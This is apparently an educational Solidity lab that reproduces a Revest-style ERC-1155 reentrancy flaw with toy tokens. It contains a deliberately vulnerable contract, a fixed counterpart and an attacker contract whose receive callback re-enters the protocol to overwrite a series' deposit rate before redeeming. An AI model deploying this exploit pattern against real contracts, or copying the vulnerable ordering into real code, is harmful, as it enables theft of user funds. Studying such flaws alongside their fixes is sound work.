// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC1155Receiver, ToyERC20, ToyERC1155} from "../common/ToyAssets.sol";

interface IRevestToy {
    function createSeries(uint256 quantity, uint256 depositPerUnit, address receiver)
        external
        returns (uint256);

    function depositAdditionalToFNFT(
        uint256 baseId,
        uint256 depositPerUnit,
        uint256 quantity,
        address receiver
    ) external returns (uint256);

    function redeem(uint256 id, uint256 quantity) external;
}

abstract contract RevestToyBase is IRevestToy {
    struct Series {
        bool exists;
        uint256 depositPerUnit;
    }

    ToyERC20 public immutable asset;
    ToyERC1155 public immutable fnft;
    uint256 public nextId = 1;
    mapping(uint256 => Series) public series;

    event Step(string message, uint256 id, uint256 quantity, uint256 depositPerUnit);

    constructor(address assetAddress, address fnftAddress) {
        asset = ToyERC20(assetAddress);
        fnft = ToyERC1155(fnftAddress);
    }

    function redeem(uint256 id, uint256 quantity) external {
        require(series[id].exists, "unknown series");
        fnft.burn(msg.sender, id, quantity);
        uint256 payout = quantity * series[id].depositPerUnit;
        require(asset.transfer(msg.sender, payout), "payout failed");
        emit Step("series redeemed", id, quantity, series[id].depositPerUnit);
    }

    function _takeDeposit(uint256 quantity, uint256 depositPerUnit) internal {
        uint256 total = quantity * depositPerUnit;
        if (total != 0) {
            require(asset.transferFrom(msg.sender, address(this), total), "deposit failed");
        }
    }
}

/// @notice Vulnerable model: nextId is advanced only after an ERC-1155 callback.
contract RevestVulnerable is RevestToyBase {
    constructor(address assetAddress, address fnftAddress)
        RevestToyBase(assetAddress, fnftAddress)
    {}

    function createSeries(uint256 quantity, uint256 depositPerUnit, address receiver)
        external
        returns (uint256 id)
    {
        id = nextId;
        require(!series[id].exists, "ID already used");
        _takeDeposit(quantity, depositPerUnit);
        series[id] = Series({exists: true, depositPerUnit: depositPerUnit});

        emit Step("series configured; nextId still stale", id, quantity, depositPerUnit);
        fnft.mint(receiver, id, quantity, "");

        // Too late: receiver code has already run.
        nextId = id + 1;
        emit Step("nextId advanced after callback", id, quantity, depositPerUnit);
    }

    function depositAdditionalToFNFT(
        uint256 baseId,
        uint256 depositPerUnit,
        uint256 quantity,
        address receiver
    ) external returns (uint256 newId) {
        require(series[baseId].exists, "base series missing");
        _takeDeposit(quantity, depositPerUnit);

        newId = nextId;
        // Deliberately missing: require(!series[newId].exists)
        series[newId] = Series({exists: true, depositPerUnit: depositPerUnit});
        emit Step("stale ID configuration overwritten", newId, quantity, depositPerUnit);
        fnft.mint(receiver, newId, quantity, "");
        nextId = newId + 1;
    }
}

/// @notice Fixed model: reserve IDs before callbacks and reject configuration collisions.
contract RevestFixed is RevestToyBase {
    constructor(address assetAddress, address fnftAddress)
        RevestToyBase(assetAddress, fnftAddress)
    {}

    function createSeries(uint256 quantity, uint256 depositPerUnit, address receiver)
        external
        returns (uint256 id)
    {
        id = nextId++;
        require(!series[id].exists, "ID already used");
        _takeDeposit(quantity, depositPerUnit);
        series[id] = Series({exists: true, depositPerUnit: depositPerUnit});
        emit Step("unique ID reserved before callback", id, quantity, depositPerUnit);
        fnft.mint(receiver, id, quantity, "");
    }

    function depositAdditionalToFNFT(
        uint256 baseId,
        uint256 depositPerUnit,
        uint256 quantity,
        address receiver
    ) external returns (uint256 newId) {
        require(series[baseId].exists, "base series missing");
        newId = nextId++;
        require(!series[newId].exists, "ID already used");
        _takeDeposit(quantity, depositPerUnit);
        series[newId] = Series({exists: true, depositPerUnit: depositPerUnit});
        emit Step("additional deposit gets a distinct ID", newId, quantity, depositPerUnit);
        fnft.mint(receiver, newId, quantity, "");
    }
}

contract RevestCallbackStudent is IERC1155Receiver {
    IRevestToy public immutable protocol;
    ToyERC20 public immutable asset;
    ToyERC1155 public immutable fnft;

    uint256 public baseId;
    uint256 public createdId;
    uint256 public additionalId;
    bool public armed;
    bool public reentrySucceeded;
    uint256 public callbacks;

    event CallbackObserved(uint256 receivedId, uint256 amount, bool attemptedAdditionalDeposit);

    constructor(address protocolAddress, address assetAddress, address fnftAddress) {
        protocol = IRevestToy(protocolAddress);
        asset = ToyERC20(assetAddress);
        fnft = ToyERC1155(fnftAddress);
    }

    function runLesson() external {
        asset.approve(address(protocol), type(uint256).max);
        fnft.setApprovalForAll(address(protocol), true);

        // A small base series makes depositAdditionalToFNFT available.
        baseId = protocol.createSeries(2, 0, address(this));

        armed = true;
        createdId = protocol.createSeries(5, 0, address(this));
        armed = false;

        uint256 createdBalance = fnft.balanceOf(address(this), createdId);
        if (createdBalance != 0) {
            protocol.redeem(createdId, createdBalance);
        }

        // In the fixed version the callback receives a distinct series ID.
        if (additionalId != 0 && additionalId != createdId) {
            uint256 additionalBalance = fnft.balanceOf(address(this), additionalId);
            if (additionalBalance != 0) {
                protocol.redeem(additionalId, additionalBalance);
            }
        }
    }

    function onERC1155Received(
        address,
        address,
        uint256 id,
        uint256 value,
        bytes calldata
    ) external returns (bytes4) {
        callbacks += 1;
        bool shouldTry = armed;
        emit CallbackObserved(id, value, shouldTry);

        if (shouldTry) {
            armed = false;
            try protocol.depositAdditionalToFNFT(baseId, 1, 1, address(this)) returns (
                uint256 newId
            ) {
                additionalId = newId;
                reentrySucceeded = true;
            } catch {
                reentrySucceeded = false;
            }
        }

        return IERC1155Receiver.onERC1155Received.selector;
    }
}
